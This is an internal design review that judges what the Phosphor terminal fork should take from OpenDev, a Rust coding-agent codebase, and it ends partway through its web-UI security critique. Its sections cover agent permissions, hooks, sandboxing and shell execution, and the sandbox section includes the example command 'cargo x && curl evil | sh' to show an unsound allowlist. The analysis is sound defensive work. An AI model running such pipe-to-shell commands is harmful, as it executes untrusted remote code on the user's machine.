# OpenDev — a judged review for Phosphor

**Branch:** `moth-parliament`. **Written:** 2026-09-05. **Status:** review, no code
written, nothing decided by this file alone.

**Subject:** `opendev-to/opendev`, MIT, Rust, workspace version `0.1.9`, reviewed at
commit `d32c660e4eed1a8e988d1fd58da88e41ba641d08` (2026-08-08). Every `path:line`
below is relative to that clone; every `app/…` or `crates/…` path with no `opendev-`
prefix is Phosphor, in this worktree.

This is a companion to `moth-parliament.md` §4, which recorded a first pass over
OpenDev's session model. It does not re-litigate the decisions there. Where it
touches them it either adds evidence or **withdraws** one of them (§8).

---

## 0. The finding that should colour everything else

**A large fraction of OpenDev's advertised architecture is not connected to
anything.** This is not a cheap shot; it is the single most important fact for
deciding what to take, because the headline features are exactly the unwired ones.

Of the twenty workspace crates, four have **no dependent crate at all** — they are
listed in `Cargo.toml`'s `members` and workspace dependency table and nothing else
imports them:

| crate | state |
|---|---|
| `opendev-sandbox` | `#![cfg(target_os = "linux")]` (`crates/opendev-sandbox/src/lib.rs:1`); the declared `microsandbox = "0.3"` dependency (`crates/opendev-sandbox/Cargo.toml:26`) is never imported; `run_code` is `Ok(String::new())` behind a TODO (`crates/opendev-sandbox/src/sandbox.rs:55-64`). Referenced only at `Cargo.toml:23` and `Cargo.toml:117`. |
| `opendev-hooks` | A complete, well-shaped hook engine (§2, T3) with no caller. Nothing constructs a `HookManager`; there is no `hooks` field in `opendev-models`' config. |
| `opendev-plugins` | A plugin manifest can declare a tool's JSON schema but has no field naming an executable, entrypoint, or handler (`crates/opendev-plugins/src/models.rs:44-53`). The user-facing commands print `"Plugin installation coming soon."` (`crates/opendev-tui/src/app/slash_commands.rs:231-243`). |
| `opendev-repl` | Superseded by the TUI. Only `HandlerRegistry` and `QueryEnhancer` are still imported (`crates/opendev-cli/src/runtime/mod.rs:33-34`); `Repl::new` is never constructed outside its own crate. |

And inside the wired crates, three of the most-cited structures are dead:

- `Session::delivery_context` — declared at `crates/opendev-models/src/session.rs:86`,
  **zero readers or writers** outside `opendev-models` and its tests. The channel
  router keeps its own in-memory `delivery_contexts` map instead
  (`crates/opendev-channels/src/router.rs:110-111`), which is never persisted.
- `PermissionConfig` / `ToolPermission::is_allowed`
  (`crates/opendev-models/src/config/permissions.rs:50-73`) — no caller outside its own
  test module. So is `PermissionRuleSet`, the *only* per-path, directory-scoped
  permission engine in the repo (`crates/opendev-runtime/src/permissions/mod.rs:26-44`).
- `SqliteSessionStore` — schema constants and all, with the comment "the `rusqlite`
  dependency is not yet added to `Cargo.toml`, so the implementation methods contain
  TODO markers" (`crates/opendev-history/src/sqlite_store.rs:44-48`).

**Why this matters for a review.** OpenDev is a Rust rewrite of a Python codebase —
the source says so repeatedly (`crates/opendev-agents/src/traits.rs:2-3`, "Mirrors
`opendev/core/base/abstract/base_agent.py`"; `crates/opendev-runtime/src/session_model.rs:8`,
"Ported from `opendev/core/runtime/session_model.py`"). Much of what looks like
architecture is a **transcribed shape whose behaviour did not come across**. Reading
the struct definitions and believing them is the specific failure mode this document
is written to avoid, and it is the failure mode `moth-parliament.md` §4 already fell
into once (§8).

The corollary is also true and worth stating: **where OpenDev is wired, it is often
good.** The doom-loop detector, the staged compaction ladder, and the TUI's render
cache are real, tested, and worth reading.

---

## 1. Model-per-role — the headline ask, judged

**Verdict: ALREADY HAVE, and Phosphor's version is more complete. But it exposes two
real defects (§6.1, §6.2).**

### What OpenDev actually ships

The README claims five workflow slots — Normal, Thinking, Compact, Self-Critique,
VLM — "each bind independently to any LLM you configure" (`README.md:33`). The code
does not support that claim. Slot by slot:

| slot | reality | evidence |
|---|---|---|
| **Normal** | Real. `model` + `model_provider`. | `crates/opendev-models/src/config/mod.rs:93-97` |
| **VLM** | Real. `model_vlm` + `model_vlm_provider`, used by the `vlm` tool. | `crates/opendev-models/src/config/mod.rs:103-106`; `crates/opendev-tools-impl/src/vlm.rs:25-30` |
| **Compact** | **Not wired.** `resolve_agent_role("compact")` exists but has exactly one caller in the tree — the web UI's config *display* route. Both real compaction paths take the primary model. | `crates/opendev-models/src/config/mod.rs:305`; sole caller `crates/opendev-web/src/routes/config.rs:71`; `crates/opendev-agents/src/react_loop/compaction.rs:110` and `crates/opendev-cli/src/runtime/query.rs:693` both read `caller.config.model` |
| **Self-Critique** | **Deleted.** A config migration removes `model_critique` / `model_critique_provider` with the comment "dead code, never consumed by any runtime path". | `crates/opendev-config/src/migration.rs:87-89`, `:100-102` |
| **Thinking** | **A dead struct field.** `MainAgentConfig::model_thinking` is set to `None` at construction and never read anywhere. | `crates/opendev-agents/src/main_agent.rs:82`, `:101` (grep for `model_thinking` across `crates/` returns only these two lines plus a field-name list) |

The product's own REPL agrees with the code, not the README: `"Available slots:
model, model_vlm"` (`crates/opendev-repl/src/commands/builtin.rs:344`), with the
valid-slot list `["model", "model_provider", "model_vlm", "model_vlm_provider"]`
(`:357`).

Compaction is the sharpest case, because it is the slot with the strongest economic
argument — summarising 100k tokens with a cheap model is the textbook saving — and
it is exactly the one that silently falls back:

```rust
// crates/opendev-agents/src/react_loop/compaction.rs:110
let compact_model = &caller.config.model;
```

That is the primary model, sent through the parent's `AdaptedClient`, i.e. the
parent's provider too.

### What Phosphor already has

`AIExecutionProfile` (`app/src/ai/execution_profiles/mod.rs:341-400`) carries **seven**
model slots, all resolved through `LLMPreferences` with a documented fallback to
`base_model`:

```rust
pub base_model: Option<LLMId>,
pub coding_model: Option<LLMId>,
pub cli_agent_model: Option<LLMId>,
pub computer_use_model: Option<LLMId>,
pub title_model: Option<LLMId>,       // conversation titles
pub active_ai_model: Option<LLMId>,   // suggestions / NLD / relevant files
pub next_command_model: Option<LLMId>,// grey autocompletion — latency-sensitive
```

Resolution is real, not decorative: `get_active_title_model`
(`app/src/ai/llms.rs:767`), `get_active_ai_model` (`:797`),
`get_active_next_command_model` (`:825`), each consumed by
`app/src/ai/agent_providers/oneshot.rs:230-262`. On top of that sit **ten** per-slot
system-prompt overrides (`ProfilePromptOverrides`, `mod.rs:235-256`; `PromptSlot`,
`:258-292`) — a dimension OpenDev has no equivalent of at all.

And compaction, the slot OpenDev drops, is wired here **with the provider attached**:

```rust
// app/src/ai/byop_compaction/config.rs:36-40
pub struct CompactionModelRef {
    pub provider_id: String,
    pub model_id: String,
}
```

That two-field shape is the substantive advantage. OpenDev's per-agent override is a
model *name* only (`SubAgentSpec::model: Option<String>`,
`crates/opendev-agents/src/subagents/spec/types.rs:32`), and the spawned subagent
reuses the parent's `Arc<AdaptedClient>`
(`crates/opendev-agents/src/subagents/manager/spawn.rs:95-99`). So in OpenDev a role
can change model but **cannot change provider**. For a BYOP product where every model
is `(base_url, key, model_id)` and the whole point is mixing a local FLM endpoint with
a hosted one, a model-name-only override is not a usable primitive. Phosphor got this
right and should not regress toward OpenDev's shape.

### The one idea in this area worth taking

Not the slot list — the **named-bundle-with-a-model** shape. See §3, TA1
(`SubAgentSpec`), which is the mechanism the README's marketing is actually
describing.

---

## 2. TAKE

Five items. Each is an *idea* to reimplement, not code to copy (§7).

### T1 — Doom-loop detection

**What it is.** A bounded ring of the last 20 tool-call fingerprints (`name` +
hash of args); after each batch, check for a repeating cycle of length 1–3 repeated 3
times. Escalate on repeat detection rather than acting once:

```rust
// crates/opendev-agents/src/doom_loop.rs:28-38
pub enum DoomLoopAction { None, Redirect, Notify, ForceStop }
```

with a separate recovery ladder — `Nudge` → `StepBack` → `CompactContext`
(`crates/opendev-agents/src/doom_loop.rs:46-54`). Constants:
`MAX_CYCLE_LEN = 3`, `DOOM_LOOP_THRESHOLD = 3`, `MAX_RECENT = 20`
(`:19-26`).

**Why it fits Phosphor specifically.** Phosphor's declared primary test target is
FastFlowLM, "a local small-model server" (`docs/DESIGN-PHOSPHOR-FORK.md` §1). Small
models loop — re-reading the same file, re-running the same failing command — and
they do it in a product where the loop is *visible*, because each iteration writes a
block into a real block list the user is watching. A terminal that fills with twelve
identical `cargo check` blocks is a worse failure than a CLI that does the same
invisibly.

**What it touches.** Phosphor has no equivalent. `grep -rni 'doom\|loop_detect' app/src/ai`
returns nothing; the only iteration cap in the agent path is
`BYOP_PREFLIGHT_MAX_ITERATIONS = 6` (`app/src/ai/blocklist/controller.rs:388`), which
guards preflight only, not the agent loop. Implementation would sit in the tool-call
dispatch path in `app/src/ai/blocklist/controller.rs` alongside the existing exchange
bookkeeping, with the detector itself a leaf module with no GPUI dependency (so it is
testable without a `warpui` context and shared by GUI and TUI for free).

**Cost.** Small — the detector is ~200 lines of pure logic. The expensive half is the
product decision about what `Notify` and `ForceStop` *look like* in a block list,
which is a real design question and not a mechanical port. Recommend landing
`Redirect` (inject a guidance message) first and treating `ForceStop` as a separate
decision.

### T2 — A project-level configuration layer

**What it is.** OpenDev merges configuration in a documented precedence order:
"project settings > user settings > env vars > defaults"
(`crates/opendev-config/src/loader/mod.rs:3`, implemented `:37-71`), with list-valued
fields concatenated-and-deduplicated rather than replaced (`:133-175`).

**Why it fits.** Phosphor has exactly one settings file. `crates/settings` knows about
`settings.toml` and nothing project-scoped (grep for project/workspace-scoped settings
across `crates/settings/src` returns only test fixtures). But a terminal is used across
many repositories in one session, and the thing a user most wants to bind per-repository
is precisely the thing §1 shows Phosphor is best at: *which model does which role here*.
"Use the local FLM endpoint in this scratch repo, the hosted model in the work one" is
not expressible today except by switching the global profile by hand.

**What it touches.** `crates/settings/src/manager.rs` (the load path), and the profile
resolution in `app/src/ai/execution_profiles/profiles.rs`. This is not a small change —
`Setting` values are read from a single registry all over the tree — so it is a
candidate for its own branch, not a rider on this one. Recorded here because the
*absence* is a genuine gap, not because it is cheap.

**Caveat on scope.** Take the precedence idea, not OpenDev's file. A project-level
`settings.toml` fragment that can name a *model* and *profile* is the valuable 5%; a
project file that can override arbitrary settings (including permissions) is a
supply-chain hazard — a cloned repository would silently reconfigure the agent's
autonomy. Whatever lands must have an explicit allowlist of project-overridable keys,
and permissions must not be on it.

### T3 — Hook events at the tool boundary

**What it is.** Ten events —
`SessionStart, UserPromptSubmit, PreToolUse, PostToolUse, PostToolUseFailure,
SubagentStart, SubagentStop, Stop, PreCompact, SessionEnd`
(`crates/opendev-hooks/src/models.rs:10-31`) — each mapping to a list of matchers, a
matcher being an optional regex over the tool name plus a shell command
(`crates/opendev-hooks/src/models.rs:103-114`, `:212-227`). The hook receives JSON on
stdin (`session_id`, `cwd`, `hook_event_name`, `tool_input`, …:
`crates/opendev-hooks/src/manager.rs:401-467`) and can **block by exiting 2**
(`crates/opendev-hooks/src/executor.rs:41-43`) or return JSON on stdout with
`decision` / `permissionDecision` / `updatedInput` / `additionalContext`
(`crates/opendev-hooks/src/manager.rs:334-345`).

**Why it fits, and it fits better here than there.** Phosphor has no hook mechanism at
all (`grep -rn 'PreToolUse\|AgentHook' app/src crates/` → nothing). It has a rich
*declarative* permission model instead — `ActionPermission`,
`command_allowlist` / `command_denylist` over `AgentModeCommandExecutionPredicate`,
`directory_allowlist`, `mcp_allowlist` (`app/src/ai/execution_profiles/mod.rs:347-362`).
That covers "which commands may run" well and covers "run `cargo fmt` after every
edit" not at all. A `PostToolUse` hook is the natural home for exactly the
project-specific discipline this repository documents in `AGENTS.md` and cannot
currently enforce.

It fits *better* here because BYOP has no server to put policy on. In a cloud agent
a hook is a convenience; in a local-only product it is the only extension point that
does not require writing Rust.

**What it touches.** The tool dispatch path in `app/src/ai/agent_providers/tools/mod.rs`
and the approval flow in `app/src/ai/blocklist/action_model.rs`. Configuration would
belong in `settings.toml` under the AI namespace, next to the existing allow/deny lists.

**Three things to do differently, all learned from their version:**

1. **Do not silently degrade a bad regex to string equality.** OpenDev does
   (`crates/opendev-hooks/src/models.rs:223-226`): a matcher whose regex fails to
   compile quietly becomes exact-match, so a hook the user believes is guarding
   `Bash.*` guards literally nothing. Fail loudly at config load.
2. **Do not swallow non-JSON stdout.** OpenDev's `unwrap_or_default()`
   (`crates/opendev-hooks/src/executor.rs:53`) means a hook that prints a syntax
   error is indistinguishable from one that approved. Surface it.
3. **Do not make blocking hooks fire-and-forget.** `run_hooks_async` clones the config
   and spawns (`crates/opendev-hooks/src/manager.rs:365-388`), so a `PostToolUse`
   block cannot be observed by the caller — the block is unenforceable by
   construction. If an event can deny, it must be awaited.

**Cost.** Moderate, and the risk is not the mechanism but the security posture: a hook
is arbitrary local code execution triggered by model output. It must be
user-configured only (never model-configured, never MCP-configured), and given T2's
caveat, never project-file-configured.

### T4 — A session cost budget

**What it is.** `CostTracker` carries an optional ceiling and the loop is expected to
check it:

```rust
// crates/opendev-runtime/src/cost_tracker.rs:63-69
/// Optional session cost budget in USD. When set, the agent loop should
/// check [`is_over_budget`] and pause when the budget is exhausted.
pub budget_usd: Option<f64>,
```

**Why it fits.** Phosphor already computes the number. `app/src/ai/usage_cost.rs` backs
`/usage` and `/cost` and is unusually careful about it — it multiplies provider-reported
tokens by *user-configured* `TokenPrice` rates and refuses to invent a default,
because "a plausible-looking wrong money figure is worse than no figure at all"
(`app/src/ai/usage_cost.rs:29-31`). Having the number and not being able to act on it
is the gap. In BYOP the user holds the invoice, so a per-conversation ceiling is
strictly more meaningful here than in a subscription product.

**What it touches.** `app/src/ai/usage_cost.rs` for the comparison, the agent loop in
`app/src/ai/blocklist/controller.rs` for the pause, and one setting. Small.

**One honest limit, and it is the same one `usage_cost.rs` already documents:** the
budget is only as good as the configured rates. Where a model has no rate the budget
must decline to guess — which means the feature must be able to say "budget not
enforceable for this model" rather than treating unpriced tokens as free. That is the
existing doctrine in that file; follow it.

### T5 — "Don't ask again" as a decision made *at the prompt*

**What it is.** OpenDev's inline approval offers three options, not two:

> 1. Yes / 2. Yes, and don't ask again (auto-approve commands starting with
> `'{prefix}'` in `{dir}`) / 3. No
> — `crates/opendev-agents/src/react_loop/phases/tool_dispatch.rs` approval flow,
> rendered at `crates/opendev-tui/src/app/render_popups.rs:593-642`, state machine at
> `crates/opendev-tui/src/controllers/approval.rs:104-121`

Option 2 stores a **command prefix scoped to a working directory** in a session-only
auto-approve set, matched case-insensitively as exact-or-prefix-plus-space
(`tool_dispatch.rs:248-255`, `:305-321`). The user may also edit the command in the
dialog before approving, and the edit is written back (`tool_dispatch.rs:322-324`).

**What Phosphor has instead.** The prompt itself is good — `TuiPermissionPrompt`
(`crates/warp_tui/src/tui_permission_prompt.rs:27-56`) offers Yes / No / edit, hosted
by the shell-command, file-edits and generic tool-call views
(`crates/warp_tui/src/tui_shell_command_view.rs:314`,
`tui_file_edits_view.rs:872`, `tui_generic_tool_call_view.rs:189-219`), and the GUI has
the equivalent card. But there is **no "and don't ask again for this"** on either
surface. The only ways to stop being asked are coarse and live in settings:
`get_execute_commands_allowlist` reads regexes from workspace/profile settings and is
not editable from the prompt (`app/src/ai/blocklist/permissions.rs:371-395`), and two
blunt toggles — "Always allow Phosphor Agent to execute read-only commands (relies on
model)" (`app/src/ai/blocklist/inline_action/requested_command.rs:823`) and "Always
allow file access for coding tasks"
(`app/src/ai/blocklist/block/view_impl/output.rs:1566`).

**Why this matters more than it looks.** Read it next to TA4. Today a user who is
tired of approving `cargo check` has exactly one escape hatch that is easy to reach:
the "relies on model" toggle — whose parenthetical is an accurate warning, since it
hands the decision to the model's own `is_read_only` boolean. The narrow, precise
control ("auto-approve `cargo ` in *this* directory") is the one buried in settings
behind a regex; the broad, model-trusting one is one click away in the prompt. That is
the wrong way round, and T5 is the fix from the user's side exactly as TA4 is the fix
from the model's side. **They should be considered together.**

**What it touches.** `crates/warp_tui/src/tui_permission_prompt.rs` and its three
hosts, `app/src/ai/blocklist/inline_action/requested_command.rs` for the GUI, and
`app/src/ai/blocklist/permissions.rs` for the store. The option-row model needs a
third row: `app/src/ai/option_snapshot.rs:13-34` currently carries only
`id`/`label`/`badge`/`disabled_reason`/footer, so there is a small shared-model change
too — which is the right place for it, since GUI and TUI must not diverge here
(`AGENTS.md` §5.9).

**One deliberate departure.** OpenDev's set is session-only and vanishes on restart.
Phosphor should offer both — "for this conversation" and "always" (writing into the
existing profile allowlist) — because the profile allowlist already exists and a
setting the user can *see and revoke* is better than an invisible in-memory grant. The
directory scope is worth keeping either way; `cargo ` in your repo is not `cargo ` in
`/tmp/something-you-just-cloned`.

---

## 3. TAKE, ADAPTED

Ideas that are right, whose implementation assumes something Phosphor is not.

### TA1 — `SubAgentSpec`: a named agent is a bundle, and the model is one field of it

**What it is.** The mechanism the README's "five workflow slots" is gesturing at, and
the one that *is* wired. A named agent spec carries its own model, tool allowlist,
permission rules, step budget, temperature, max_tokens, display colour, and isolation
strategy (`crates/opendev-agents/src/subagents/spec/types.rs:13-105`). Resolution at
spawn is a clean three-level fallback:

```rust
// crates/opendev-agents/src/subagents/manager/spawn.rs:95-99
let model = model_override
    .or(spec.model.as_deref())
    .unwrap_or(parent_model)
```

Specs come from three places that merge: built-ins
(`crates/opendev-agents/src/subagents/spec/builtins.rs`), a config map keyed by agent
name (`AppConfig::agents: HashMap<String, AgentConfigInline>`,
`crates/opendev-models/src/config/mod.rs:184-187`), and user files. And crucially
`AgentMode` (`crates/opendev-agents/src/subagents/spec/mode.rs:5-14`) says whether a
spec may be a *top-level* agent, a *spawned* one, or both — so the same declarative
object describes "the profile I am chatting with" and "the worker I fan out to".

**Why the shape is right and Phosphor's is nearly there.** `AIExecutionProfile` is
already this object: name, models, permissions, allow/denylists, prompt overrides
(`app/src/ai/execution_profiles/mod.rs:341-400`). What it lacks is (a) a **tool
allowlist**, and (b) any notion that a profile could describe something other than the
user's own current session. OpenDev's addition of `tools: Vec<String>` and
`AgentMode` to the same object is the generalisation, and it is the right one:
"restricted agent" and "user profile" are the same data with a different mode.

**What must change to fit Phosphor.**

1. **`model` must become `(provider, model)`.** OpenDev's is a bare `String`
   (`spec/types.rs:32`) and the spawned agent reuses the parent's `AdaptedClient`, so a
   role cannot change provider. Phosphor already has the right two-field shape in
   `CompactionModelRef` (`app/src/ai/byop_compaction/config.rs:36-40`) and in `LLMId`;
   use it.
2. **A tool allowlist here means something different.** OpenDev's restricted tools are
   file/search/web tools. Phosphor's tool set includes `run_shell_command` against a
   real pty, `write_to_long_running_shell_command` and `computer_use`. A "read-only
   agent" in Phosphor is a more meaningful and more useful object than in OpenDev,
   precisely because the things it is denied are more dangerous.
3. **`IsolationMode::Worktree` does not transfer.** See §4, R3.

**What it touches.** `app/src/ai/execution_profiles/mod.rs` (two new fields on the
profile), `app/src/ai/execution_profiles/editor/` (the settings UI), and the tool
schema assembly in `app/src/ai/agent_providers/tools/mod.rs`. Additive; no existing
profile changes meaning.

**Do not take the fan-out with it.** `subagent_sessions: HashMap<tool_call_id,
session_id>` + `parent_id` (`crates/opendev-models/src/session.rs:100-105`) is a tidy
data model, and `moth-parliament.md` §4 is right that it costs no new type. But
Phosphor's conversations live in SQLite with a persister and a restore path, and the
product question — what does a fanned-out sub-conversation *look like* in a block
list — is entirely unanswered. The **spec** is worth taking now; the fan-out is a
separate decision with a real UI cost, and OpenDev's own answer to it is a TUI overlay
(§5, AH5) rather than anything that would fit a terminal.

### TA2 — Per-tool truncation rules instead of one global character cut

**What it is.** Every tool declares how its output should be cut when it is too long:
`TruncationRule` with Head / Tail / HeadTail strategies
(`crates/opendev-tools-core/src/sanitizer.rs:13-53`), defaults keyed by tool name
(`sanitizer.rs:64-83` — `Bash` keeps the *tail* at 8000, `Read` keeps the *head* at
15000), an MCP fallback (`sanitizer.rs:59`), and the overflow written to a file
retained 7 days and capped at 1 MB (`sanitizer.rs:87-93`).

**Why Phosphor needs it.** Phosphor has one number for everything:

```rust
// app/src/ai/agent_providers/chat_stream.rs:944
const MAX_TOOL_RESPONSE_CHARS: usize = 40_000;
```

A character-level cut applied uniformly to every tool result. The tree already
documents this as a defect, in a comment written while working around it:

> the only backstop was `chat_stream`'s 40,000-character truncation, which slices the
> serialized JSON mid-array and mid-path
> — `app/src/ai/agent_providers/tools/search.rs:150`

The workaround there is a per-tool cap applied *inside* `search.rs` before
serialization, with a `truncated: true` marker so the model is told
(`search.rs:215-216`). That is the right answer, implemented once, for one tool. The
generalisation is TA2: let each tool declare its rule and let the sanitizer honour it.
Head-vs-tail is the substantive part — for a shell command the interesting output is
at the *end*, and a head-cut throws away the error; for a file read it is at the
start.

**The adaptation.** OpenDev's overflow-to-a-file trick is designed for an agent that
can then `Read` the overflow file. Phosphor should not do that: the full output is
already in the block list, visible to the user, which is a better place than a
temporary file. Phosphor's version should cut, mark, and tell the model *what kind* of
cut it was.

**What it touches.** `app/src/ai/agent_providers/chat_stream.rs:944` and the
`OpenAiTool` trait in `app/src/ai/agent_providers/tools/mod.rs` (one new defaulted
method). Genuinely small, and it fixes a known bug rather than adding a feature.

### TA3 — Deferred tool schemas

**What it is.** Only a core set of tools ships its full JSON schema in the request;
the rest ship as name + one-line description, and a `ToolSearch` tool fetches the full
schema on demand (`crates/opendev-tools-core/src/registry/mod.rs:271`, `:290-298`;
`crates/opendev-tools-impl/src/agents/tool_search.rs:28`, query forms at `:38-42`;
per-tool opt-in via `BaseTool::should_defer()`,
`crates/opendev-tools-core/src/traits.rs:561`, e.g. the LSP tool at
`crates/opendev-tools-impl/src/lsp_query.rs:84`).

**Why it fits Phosphor unusually well.** `DESIGN-PHOSPHOR-FORK.md` §2 records the
motivating problem in its own words: per-prompt system-prompt overrides exist to "keep
small FLM-served models from drowning in a 9k-token default prompt". Tool schemas are
the *other* half of that budget, and they are the half that grows without bound —
Phosphor ships built-ins plus every skill plus every tool from every connected MCP
server, and MCP tool schemas are written by third parties with no size discipline.
A user with three MCP servers connected pays that cost on every request to a local
model with an 8k or 16k window.

**The adaptation, and it is the reason this is ADAPTED rather than TAKE.** Deferral
costs a round trip: the model asks for a schema, then calls the tool. On a fast hosted
model that is invisible; on a local model it is a visible pause, and it competes
directly with the token saving it buys. So this should be **conditional on the
model's context window**, which Phosphor already knows
(`AgentProviderModel::context_window`, referenced at
`app/src/ai/byop_compaction/config.rs:73-90`) — defer when schemas would exceed some
fraction of the window, ship everything when they would not. Do not adopt OpenDev's
unconditional version; it pays the round trip on a 1M-window model for nothing.

**What it touches.** The tool-schema assembly in
`app/src/ai/agent_providers/tools/mod.rs` and `chat_stream.rs`, plus one new tool.
Medium. Worth measuring the actual schema byte count in a realistic MCP configuration
before committing — if it is 2 KB the feature is not worth the round trip, and that
measurement has not been made.

### TA4 — Compute `is_read_only`; do not take the model's word for it

**What it is.** OpenDev decides whether a bash command is read-only by *parsing* it:
split on `&&`, `||`, `;`, `|`, require every segment's head word to be in an allowlist
of ~55 command names, and reject any `>` redirect
(`crates/opendev-tools-impl/src/bash/mod.rs:18-120`). The result drives automatic
parallel batching of consecutive safe calls
(`crates/opendev-tools-core/src/parallel.rs:77-120`).

**Why this is a finding and not a feature request.** Phosphor asks the *model*:

```rust
// app/src/ai/agent_providers/tools/shell.rs:15-19
struct Args {
    command: String,
    #[serde(default)]
    is_read_only: bool,
    …
}
```

It is declared in the tool schema (`shell.rs:38`) and read at `:76`, so it is a
boolean the LLM writes. It then reaches a permission decision. Under
`ActionPermission::AgentDecides`:

```rust
// app/src/ai/blocklist/permissions.rs:983-990
// For now, the heuristic is if the command is read only or if we're executing
// a plan. Otherwise, we don't want to autoexecute.
if is_read_only {
    CommandExecutionPermission::Allowed(
        CommandExecutionPermissionAllowedReason::AgentDecided,
    )
```

and, behind a feature flag, the same function auto-allows on another model-asserted
boolean before it even reaches that point — `is_risky == Some(false)`
(`permissions.rs:957-963`). So on the `AgentDecides` path, the model's own assertion
about its own command is the thing that decides whether the user is asked.

**Stated fairly, because it would be easy to overstate.** This is not an open door.
The user and organisation denylists are checked *first* and take precedence
(`permissions.rs:930-947`), `contains_redirection` is rejected
(`permissions.rs:965-969`), and — most importantly — `execute_commands` **defaults to
`AlwaysAsk`**, not `AgentDecides` (`app/src/ai/execution_profiles/mod.rs:407`). The
default posture is safe. The exposure is for a user who has opted into `AgentDecides`,
and the shape of it is: a denylist enumerates what is known-bad, and everything else
falls through to what the model claimed.

**The adaptation.** OpenDev's direction is right and its list is not — a hardcoded
55-command allowlist is a maintenance burden and will be wrong for someone. What
transfers is the *inversion*: on the `AgentDecides` path, derive read-only-ness from
the command text rather than accept it from the model, and treat the model's boolean
as a hint that can only make the decision *more* conservative, never less. Phosphor
already has the parsing machinery — `AgentModeCommandExecutionPredicate` and the
denylist matcher walk `denylist_candidates_per_command`, i.e. the command is already
decomposed into segments at `permissions.rs:939-943`.

**What it touches.** `app/src/ai/blocklist/permissions.rs` (the `AgentDecides` arm
only), and nothing else — the tool schema can keep the field. This is the smallest
change on this list and the only one that closes a hole rather than adding a
capability. **Recommend filing it as a defect** per `AGENTS.md` §5.11 rather than
carrying it as a design idea.

---

## 4. REJECT

Each with a reason grounded in what Phosphor is, not in taste.

### R1 — The execution model (confirmed, with more evidence than `moth-parliament.md` §4 had)

`moth-parliament.md` §4 already rejects this. The evidence is stronger than that entry
states, so it is recorded here rather than left as an assertion.

Foreground and background bash construct the process identically, per call:

```rust
// crates/opendev-tools-impl/src/bash/foreground.rs:48-56  (and background.rs:26-34)
let mut cmd = Command::new("sh");
cmd.arg("-c").arg(&exec_command).current_dir(working_dir)
   .env_clear().envs(&safe_env)
```

Consequences, none of which are acceptable in a terminal: no `cd` survives, no
exported variable survives, no activated virtualenv survives, and `workdir` is a
per-call argument (`bash/mod.rs:323-334`). Interactive programs are handled by
*textually rewriting the command* — `python` becomes `python -u`, and anything
matching an interactive pattern is wrapped in `yes | …`
(`crates/opendev-tools-impl/src/bash/helpers.rs:147-164`). That is a coping strategy
for not having a pty.

Their "background" is weaker still: it captures startup output for up to 20 s, stores
the handle in an in-memory map, and returns — and **there is no tool to read later
output, poll, or kill the job.** `BackgroundProcess` is `#[allow(dead_code)]`
(`bash/helpers.rs:76-77`), and the registry explicitly refuses
`get_background_result` as "not callable directly" (`registry/execution.rs:119-126`).

Phosphor's equivalent is not merely different, it is the thing this fork exists to
have: `run_shell_command` runs on the real pty and can return a
`LongRunningCommandSnapshot` immediately (`app/src/ai/agent_providers/tools/shell.rs:23-27`),
after which `write_to_long_running_shell_command` and `read_shell_command_output` let
the agent drive an interactive program — including raw/line/block input modes
(`app/src/ai/agent_providers/tools/long_shell.rs:1-29`). Adopting OpenDev's model
would delete a working feature.

### R2 — `opendev-sandbox`

There is nothing to take. It is `#![cfg(target_os = "linux")]`
(`crates/opendev-sandbox/src/lib.rs:1`), its declared `microsandbox` dependency is
never imported (`crates/opendev-sandbox/Cargo.toml:26`), `run_code` returns an empty
string behind a TODO (`crates/opendev-sandbox/src/sandbox.rs:55-64`), the LLM path
returns the literal string `"LLM call not yet wired"`
(`crates/opendev-sandbox/src/session.rs:159-162`), and no crate depends on it.

The *other* thing named sandbox — `crates/opendev-runtime/src/sandbox.rs` — is a
prefix-matched command allowlist that is also never called, and would be unsound if it
were: `check_command` inspects only the first word (`:129-143`), so
`cargo x && curl evil | sh` passes.

Beyond the code being absent, the design does not fit. A microVM per tool call is
coherent for an agent whose tools are file edits and `sh -c`. Phosphor's tool surface
includes a real pty the user is watching, `computer_use`, and a terminal that is
supposed to *be* the user's shell. Isolation in this product means the OS's own
boundaries (a container the user chose, an SSH host — see `moth-parliament.md` §4a),
not a VM the app spawns behind the user's back. Phosphor also already declines the
adjacent thing: `crates/isolation_platform` exists, and `DECLINED.md` records what was
kept and what was not.

### R3 — `IsolationMode::Worktree`

OpenDev can run a subagent in its own git worktree
(`crates/opendev-agents/src/subagents/spec/types.rs:95-99`; `WorktreeManager` at
`crates/opendev-runtime/src/worktree/mod.rs:1-5,44-50`, creating
`{repo}/.opendev/worktrees/{id}` on branch `opendev/agent-{id}`, with a
`MergeResult::{Clean,Conflict,NoChanges}` merge-back).

Reject, for a reason specific to this product rather than to the idea. A worktree is
a **different directory**, and in Phosphor a conversation's directory is the thing the
user is looking at — it is in the pane header, it is where the pty lives, and
`moth-parliament.md` §3 step 3 makes the working directory an explicit, visible
property of a conversation. An agent silently editing `/repo/.phosphor/worktrees/ab12`
while the user's terminal sits in `/repo` produces a block list that describes work
the user cannot see in the shell in front of them. That is the exact failure the
"split the terminal into the same pane, below the conversation" decision
(`DESIGN-PHOSPHOR-FORK.md` §9, "the user has to see what ran") exists to prevent.

The idea is not wrong in general — it is right for a headless fan-out — but it belongs
to the fan-out decision (§3, TA1) and not before it. If it is ever built, the worktree
must be a *visible* location the user can open, not an implementation detail.

### R4 — `opendev-plugins`

A plugin manifest can declare `tools: Vec<ToolDefinition>` where `ToolDefinition` is
`{name, description, parameters}` — with **no field naming an executable, entrypoint,
command, or handler** (`crates/opendev-plugins/src/models.rs:44-53`). A plugin can
therefore declare a tool's schema and has no way to implement it. Installation is
`git clone --depth 1` of an arbitrary marketplace URL
(`crates/opendev-plugins/src/marketplace.rs:333-352`) with no validation beyond name
extraction. The user-facing commands print "coming soon"
(`crates/opendev-tui/src/app/slash_commands.rs:231-243`).

Nothing to take, and the slot is already filled: Phosphor has MCP
(`app/src/ai/mcp/`, with stdio and HTTP transports at
`app/src/ai/mcp/parsing.rs:61,80`) for third-party tools and skills
(`app/src/ai/skills/`, including bundled, remote and file-watched skills) for
third-party prompts. A third extension mechanism with weaker semantics than either is
a maintenance cost with no user.

### R5 — The web UI, and specifically its security posture

**Reject the whole thing**, and record *why* in some detail, because the surface is
tempting — a browser view onto a running conversation looks like it would answer
`moth-parliament.md` §4a's question about viewing work from another machine.

It would not, and its implementation is a cautionary tale:

- **No route is authenticated.** `routes/auth.rs` implements Argon2id password hashing
  and an HMAC session cookie (`crates/opendev-web/src/routes/auth.rs:135-168`), but
  the only layer applied to the app is CORS (`crates/opendev-web/src/server.rs:50`);
  `verify_token` and the cookie type appear nowhere outside `auth.rs`.
